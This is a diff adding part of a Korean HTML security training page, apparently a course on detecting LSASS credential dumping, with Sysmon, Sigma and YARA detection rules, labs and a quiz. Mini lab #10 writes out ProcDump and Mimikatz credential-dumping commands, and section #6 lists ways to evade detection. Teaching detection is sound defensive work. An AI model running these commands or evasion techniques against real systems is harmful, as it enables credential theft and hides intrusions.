+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">      &lt;TargetImage condition=&#34;is&#34;&gt;</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        C:\Windows\System32\lsass.exe</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">      &lt;/TargetImage&gt;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    &lt;/ProcessAccess&gt;</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">    &lt;!-- 신뢰할 수 있는 프로세스 제외 --&gt;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    &lt;ProcessAccess onmatch=&#34;exclude&#34;&gt;</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">      &lt;SourceImage condition=&#34;is&#34;&gt;</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        C:\Windows\System32\svchost.exe</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">      &lt;/SourceImage&gt;</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">      &lt;SourceImage condition=&#34;is&#34;&gt;</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        C:\Windows\System32\csrss.exe</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">      &lt;/SourceImage&gt;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    &lt;/ProcessAccess&gt;</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  &lt;/EventFiltering&gt;</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">&lt;/Sysmon&gt;</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch5" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#5.</span> Sigma 탐지 규칙 작성</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">📋</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">Sigma 규칙이란?</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">Sigma는 SIEM 벤더에 독립적인 탐지 규칙 형식입니다. YAML로 작성되며, Splunk, Elasticsearch, Microsoft Sentinel 등 다양한 SIEM으로 변환할 수 있습니다. LSASS 메모리 접근을 탐지하는 Sigma 규칙을 작성하면 어떤 SIEM 환경에서든 활용 가능합니다.</p>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">lsass_access.yml</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">yaml</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — 실제 환경에서 실행하지 마세요</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">title: Suspicious LSASS Process Access</div>
+                            <div class="text-slate-500 text-xs leading-relaxed font-mono whitespace-pre">id: 0d894093-71bc-43c3-a4cf-de7d2c37a8b2</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">status: production</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">level: high</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">description: &gt;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">  Detects suspicious access to LSASS process memory</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">  commonly used for credential dumping</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">logsource:</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  category: process_access</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  product: windows</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">detection:</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">  selection:</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    TargetImage|endswith: &#39;\lsass.exe&#39;</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    GrantedAccess|contains:</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;0x1010&#39;  # VM_READ + QUERY_INFO</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;0x1410&#39;  # + QUERY_LIMITED</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;0x1F0FFF&#39; # FULL ACCESS</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">  filter_system:</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    SourceImage|startswith:</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">      - &#39;C:\Windows\System32\&#39;</div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">  condition: selection and not filter_system</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch6" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#6.</span> 탐지 우회 기법 분석</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 bg-red-50/50 dark:bg-red-900/10">
+                        <h3 class="font-bold text-lg mb-2 text-red-600 dark:text-red-400">⚠️ 공격자의 탐지 우회 전략</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">실무에서 공격자는 기본 탐지를 우회하기 위해 다양한 기법을 사용합니다. 방어자는 이러한 우회 기법을 이해해야 더 효과적인 탐지 규칙을 작성할 수 있습니다.</p>
+                    </div>
+                    <div class="glass-panel p-6 rounded-xl">
+                        <h3 class="font-bold text-lg mb-4 hl-blue">주요 탐지 우회 기법과 대응</h3>
+                        <div class="overflow-x-auto">
+                            <table class="w-full text-sm border-collapse">
+                                <thead>
+                                    <tr class="bg-blue-500/10 dark:bg-blue-500/5">
+                                        <th class="text-left p-3 font-bold border-b border-blue-400/30">우회 기법</th>
+                                        <th class="text-left p-3 font-bold border-b border-blue-400/30">원리</th>
+                                        <th class="text-left p-3 font-bold border-b border-blue-400/30">대응 방법</th>
+                                    </tr>
+                                </thead>
+                                <tbody class="text-cgray dark:text-slate-300">
+                                    <tr class="border-b border-slate-200 dark:border-slate-700">
+                                        <td class="p-3 font-bold">도구명 변경</td>
+                                        <td class="p-3 text-center">procdump.exe → debug.exe 리네임</td>
+                                        <td class="p-3 text-center">해시 기반 탐지, YARA 시그니처</td>
+                                    </tr>
+                                    <tr class="border-b border-slate-200 dark:border-slate-700">
+                                        <td class="p-3 font-bold">Direct Syscall</td>
+                                        <td class="p-3 text-center">ntdll.dll 우회하여 커널 직접 호출</td>
+                                        <td class="p-3 text-center">ETW 기반 커널 모니터링</td>
+                                    </tr>
+                                    <tr class="border-b border-slate-200 dark:border-slate-700">
+                                        <td class="p-3 font-bold">LSASS 복제</td>
+                                        <td class="p-3 text-center">MiniDumpWriteDump 대신 snapshot 사용</td>
+                                        <td class="p-3 text-center">핸들 생성 이벤트 모니터링</td>
+                                    </tr>
+                                    <tr class="border-b border-slate-200 dark:border-slate-700">
+                                        <td class="p-3 font-bold">메모리 내 분석</td>
+                                        <td class="p-3 text-center">디스크 접근 없이 메모리에서 파싱</td>
+                                        <td class="p-3 text-center">메모리 접근 패턴 이상 탐지</td>
+                                    </tr>
+                                    <tr class="">
+                                        <td class="p-3 font-bold">시간차 공격</td>
+                                        <td class="p-3 text-center">덤프와 추출을 시간 간격으로 분리</td>
+                                        <td class="p-3 text-center">시계열 상관 분석</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch7" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#7.</span> YARA 규칙으로 도구 탐지</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">🎯</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">YARA 규칙 기반 탐지</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">YARA는 파일 및 메모리에서 악성코드 패턴을 탐지하는 규칙 엔진입니다. Mimikatz와 같은 도구는 특유의 문자열과 바이너리 패턴을 가지고 있어, 파일명을 변경하더라도 YARA 규칙으로 탐지할 수 있습니다.</p>
+                    </div>
+                    <!-- POC Code Panel -->
+                    <div class="glass-panel rounded-xl overflow-hidden">
+                        <div class="terminal-bg px-4 py-2 flex items-center justify-between border-b border-slate-600">
+                            <div class="flex items-center gap-2">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">detect_mimikatz.yar</span>
+                            </div>
+                            <span class="text-[10px] text-slate-500 font-mono">yara</span>
+                        </div>
+                        <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드 — 실제 환경에서 실행하지 마세요</div>
+                        <div class="terminal-bg p-4 overflow-x-auto">
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">rule Mimikatz_Strings {</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">    meta:</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">        author = &#34;GOTROOT EDU&#34;</div>
+                            <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">        description = &#34;Detects Mimikatz by string patterns&#34;</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">        severity = &#34;critical&#34;</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    strings:</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s1 = &#34;sekurlsa::logonpasswords&#34; ascii wide</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s2 = &#34;gentilkiwi&#34; ascii  // 개발자 이름</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s3 = &#34;mimikatz&#34; ascii wide nocase</div>
+                            <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">        $s4 = &#34;lsadump::&#34; ascii wide</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">        $api1 = &#34;MiniDumpWriteDump&#34; ascii</div>
+                            <div class="text-purple-400 text-xs leading-relaxed font-mono whitespace-pre">        $api2 = &#34;OpenProcess&#34; ascii</div>
+                            <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                            <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">    condition:</div>
+                            <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">        (2 of ($s*)) or ($api1 and $api2 and 1 of ($s*))</div>
+                            <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">}</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ch8" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#8.</span> 방어 아키텍처: 다층 방어</h2>
+                <div class="space-y-6">
+                    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-blue-400">
+                        <div class="text-2xl mb-2">🏰</div>
+                        <h3 class="font-bold text-lg mb-2 hl-blue">Defense-in-Depth 전략</h3>
+                        <p class="text-cgray dark:text-slate-300 leading-relaxed">단일 방어 메커니즘은 언제나 우회될 수 있습니다. 효과적인 LSASS 보호를 위해서는 다층 방어(Defense-in-Depth) 전략이 필요합니다: 예방 계층(Credential Guard + PPL) → 탐지 계층(Sysmon + Sigma + YARA) → 대응 계층(자동화된 격리 + 포렌식).</p>
+                    </div>
+                    <div class="glass-panel p-6 rounded-xl">
+                        <h3 class="font-bold text-lg mb-4 hl-blue">다층 방어 아키텍처</h3>
+                        <div class="terminal-bg rounded-lg p-4 overflow-x-auto">
+                            <pre class="text-xs leading-relaxed">  ┌─────────────────────────────────────────────┐
+  │              Layer 1: 예방 (Prevention)       │
+  │  Credential Guard  │  PPL  │  WDigest Off    │
+  ├─────────────────────────────────────────────┤
+  │              Layer 2: 탐지 (Detection)        │
+  │  Sysmon EID 10  │  Sigma Rules  │  YARA      │
+  ├─────────────────────────────────────────────┤
+  │              Layer 3: 대응 (Response)          │
+  │  SOAR Playbook  │  Auto-Isolate  │  Forensic │
+  └─────────────────────────────────────────────┘</pre>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════ -->
+            <!-- Mini Labs -->
+            <!-- ═══════════════════════════════════════════════ -->
+            <section id="minilab-0" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">#9.</span> Mini Lab — Windows API와 용도 매칭</h2>
+                <div class="glass-panel rounded-xl overflow-hidden">
+                    <div class="terminal-bg px-4 py-2 flex items-center gap-2 border-b border-slate-600">
+                        <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                        <span class="text-xs text-slate-400 ml-2 font-mono">mini-lab-1.sh</span>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <p class="text-sm text-cgray dark:text-slate-300 mb-4">각 Windows API가 LSASS 덤프에서 어떤 역할을 하는지 매칭하세요.</p>
+                        <div id="match-game-0" class="space-y-4"></div>
+                        <div class="flex items-center justify-between mt-6 pt-4 border-t border-slate-200 dark:border-slate-700">
+                            <div class="font-mono text-sm">점수: <span id="match-score-0" class="hl-blue text-lg">0</span> / <span>5</span></div>
+                            <button onclick="initMatchGame_0()" class="bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-4 rounded font-mono text-sm transition cursor-pointer">↻ 다시 시작</button>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="minilab-1" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">#10.</span> Mini Lab — ProcDump LSASS 덤프 시뮬레이션</h2>
+                <div class="glass-panel rounded-xl overflow-hidden">
+                    <div class="terminal-bg px-4 py-2 flex items-center gap-2 border-b border-slate-600">
+                        <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                        <span class="text-xs text-slate-400 ml-2 font-mono">mini-lab-2.sh</span>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <p class="text-sm text-cgray dark:text-slate-300 mb-4">공격자의 ProcDump 기반 LSASS 덤프 과정을 단계별로 따라가 보세요.</p>
+                        <div id="step-click-1" class="space-y-3">
+                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="0" onclick="handleStepClick_1(0)">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">1️⃣</div>
+                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">관리자 권한 CMD 실행</div>
+                                </div>
+                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">공격자는 먼저 관리자 권한의 명령 프롬프트를 확보합니다. 이를 위해 UAC 우회 또는 권한 상승 취약점을 사용합니다.</div>
+                            </div>
+                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="1" onclick="handleStepClick_1(1)">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">2️⃣</div>
+                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">ProcDump 다운로드/전송</div>
+                                </div>
+                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">Microsoft Sysinternals에서 ProcDump를 다운로드하거나, 이미 시스템에 있는 경우 그대로 사용합니다. 합법적 도구이므로 AV 탐지를 회피합니다.</div>
+                            </div>
+                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="2" onclick="handleStepClick_1(2)">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">3️⃣</div>
+                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">LSASS PID 확인</div>
+                                </div>
+                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">tasklist /FI &#34;IMAGENAME eq lsass.exe&#34; 명령으로 LSASS 프로세스 ID를 확인합니다.</div>
+                            </div>
+                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="3" onclick="handleStepClick_1(3)">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">4️⃣</div>
+                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">메모리 덤프 실행</div>
+                                </div>
+                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">procdump.exe -ma &lt;PID&gt; lsass.dmp -accepteula 명령으로 전체 메모리를 덤프합니다. -ma 옵션은 전체 메모리를 포함합니다.</div>
+                            </div>
+                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="4" onclick="handleStepClick_1(4)">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">5️⃣</div>
+                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">덤프 파일 외부 전송</div>
+                                </div>
+                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">생성된 .dmp 파일을 C2 서버로 전송하거나, USB 드라이브로 복사합니다. 이후 오프라인에서 분석합니다.</div>
+                            </div>
+                            <div class="step-btn p-4 rounded-lg border-2 border-slate-200 dark:border-slate-700 cursor-pointer transition-all" data-step="5" onclick="handleStepClick_1(5)">
+                                <div class="flex items-center gap-3">
+                                    <div class="w-8 h-8 rounded-full bg-slate-200 dark:bg-slate-700 flex items-center justify-center text-sm font-bold flex-shrink-0">6️⃣</div>
+                                    <div class="font-bold text-sm text-[#1e293b] dark:text-white">Mimikatz로 오프라인 분석</div>
+                                </div>
+                                <div class="step-detail hidden mt-3 ml-11 text-sm text-cgray dark:text-slate-300 leading-relaxed">공격자의 시스템에서 mimikatz &#39;sekurlsa::minidump lsass.dmp&#39; &#39;sekurlsa::logonpasswords&#39; 명령으로 자격증명을 추출합니다.</div>
+                            </div>
+                        </div>
+                        <div id="step-result-1" class="hidden mt-4 p-4 rounded-lg bg-blue-50 dark:bg-blue-900/20 border border-blue-300 dark:border-blue-700 text-center">
+                            <p class="text-sm font-bold text-blue-700 dark:text-blue-400">🎉 모든 단계를 완료했습니다!</p>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="minilab-2" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">#11.</span> Mini Lab — Sigma 규칙 빈칸 채우기</h2>
+                <div class="glass-panel rounded-xl overflow-hidden">
+                    <div class="terminal-bg px-4 py-2 flex items-center gap-2 border-b border-slate-600">
+                        <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                        <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                        <span class="text-xs text-slate-400 ml-2 font-mono">mini-lab-3.sh</span>
+                    </div>
+                    <div class="p-6 space-y-4">
+                        <p class="text-sm text-cgray dark:text-slate-300 mb-4">LSASS 접근 탐지 Sigma 규칙의 빈칸을 올바른 값으로 채우세요.</p>
+                        <div class="terminal-bg rounded-lg overflow-hidden">
+                            <div class="px-4 py-2 flex items-center gap-2 border-b border-slate-600">
+                                <span class="w-3 h-3 rounded-full bg-red-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-yellow-500"></span>
+                                <span class="w-3 h-3 rounded-full bg-green-500"></span>
+                                <span class="text-xs text-slate-400 ml-2 font-mono">sigma_lsass_fill.yml</span>
+                            </div>
+                            <div class="bg-red-900/30 px-4 py-2 text-xs text-red-300 font-mono">⚠️ 교육 목적 코드</div>
+                            <div class="p-4 space-y-1" id="code-fill-2">
+                                <div class="text-green-400 text-xs leading-relaxed font-mono whitespace-pre">title: LSASS Memory Access Detection</div>
+                                <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">status: production</div>
+                                <div class="text-red-400 text-xs leading-relaxed font-mono whitespace-pre">level: high</div>
+                                <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                                <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">logsource:</div>
+                                <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  category: <input type="text" class="code-blank bg-transparent border-0 border-b-2 border-dashed border-blue-400 text-blue-300 font-mono text-xs w-24 text-center focus:outline-none focus:border-blue-300" data-blank-id="blank1" data-answer="process_access" placeholder="카테고리?"></div>
+                                <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">  product: windows</div>
+                                <div class="text-white text-xs leading-relaxed font-mono whitespace-pre"></div>
+                                <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">detection:</div>
+                                <div class="text-orange-400 text-xs leading-relaxed font-mono whitespace-pre">  selection:</div>
+                                <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    TargetImage|endswith: '\<input type="text" class="code-blank bg-transparent border-0 border-b-2 border-dashed border-blue-400 text-blue-300 font-mono text-xs w-24 text-center focus:outline-none focus:border-blue-300" data-blank-id="blank2" data-answer="lsass.exe" placeholder="프로세스명?">'</div>
+                                <div class="text-cyan-400 text-xs leading-relaxed font-mono whitespace-pre">    GrantedAccess|contains: '<input type="text" class="code-blank bg-transparent border-0 border-b-2 border-dashed border-blue-400 text-blue-300 font-mono text-xs w-24 text-center focus:outline-none focus:border-blue-300" data-blank-id="blank3" data-answer="0x1010" placeholder="접근 권한?">'</div>
+                                <div class="text-yellow-400 text-xs leading-relaxed font-mono whitespace-pre">  condition: selection</div>
+                            </div>
+                        </div>
+                        <div class="flex items-center justify-between mt-4">
+                            <button onclick="checkCodeFill_2()" class="bg-blue-500 hover:bg-blue-600 text-white font-bold py-2 px-6 rounded font-mono text-sm transition cursor-pointer">정답 확인</button>
+                            <button onclick="resetCodeFill_2()" class="bg-slate-200 dark:bg-slate-700 hover:bg-slate-300 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-4 rounded font-mono text-sm transition cursor-pointer">↻ 초기화</button>
+                        </div>
+                        <div id="code-fill-result-2" class="hidden mt-4 p-4 rounded text-sm font-mono shadow-sm"></div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════ -->
+            <!-- Quiz Section -->
+            <!-- ═══════════════════════════════════════════════ -->
+            <section id="quiz" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+                <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-blue-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-blue">#Q.</span> 종합 퀴즈</h2>
+                <div class="glass-panel p-6 rounded-xl">
+                    <div id="final-quiz" class="space-y-8">
+                        <div class="quiz-q" data-correct="2">
+                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q1. Mimikatz가 LSASS에서 자격증명을 추출할 때 사용하는 핵심 Windows API 조합은?</h3>
+                            <div class="space-y-2 text-sm">
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq1" value="1" class="mr-3"> CreateFile + WriteFile
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq1" value="2" class="mr-3"> OpenProcess + ReadProcessMemory
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq1" value="3" class="mr-3"> RegOpenKey + RegQueryValue
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq1" value="4" class="mr-3"> socket + connect + send
+                                </label>
+                            </div>
+                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 Mimikatz는 OpenProcess()로 LSASS 프로세스 핸들을 획득한 후, ReadProcessMemory()로 메모리를 읽어 인증 구조체를 파싱합니다. PROCESS_VM_READ 권한이 필수입니다.</div>
+                        </div>
+                        <div class="quiz-q" data-correct="2">
+                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q2. comsvcs.dll을 이용한 LSASS 덤프가 탐지하기 어려운 이유는?</h3>
+                            <div class="space-y-2 text-sm">
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq2" value="1" class="mr-3"> 암호화된 통신을 사용하기 때문
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq2" value="2" class="mr-3"> Windows에 기본 포함된 합법적 DLL이므로
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq2" value="3" class="mr-3"> 커널 모드에서 실행되기 때문
+                                </label>
+                                <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent">
+                                    <input type="radio" name="fq2" value="4" class="mr-3"> 네트워크 트래픽이 없기 때문
+                                </label>
+                            </div>
+                            <div class="quiz-explanation hidden mt-2 p-3 rounded bg-blue-50 dark:bg-blue-900/20 text-xs text-blue-700 dark:text-blue-300">💡 comsvcs.dll은 Windows에 기본 포함된 합법적 DLL로, rundll32.exe를 통해 MiniDump 기능을 호출합니다. 서명된 Microsoft 파일이므로 대부분의 AV/EDR이 기본 상태에서 차단하지 않습니다.</div>
+                        </div>
+                        <div class="quiz-q" data-correct="1">
+                            <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q3. Sysmon Event ID 10에서 LSASS 접근을 탐지할 때 확인해야 할 핵심 필드는?</h3>
+                            <div class="space-y-2 text-sm">
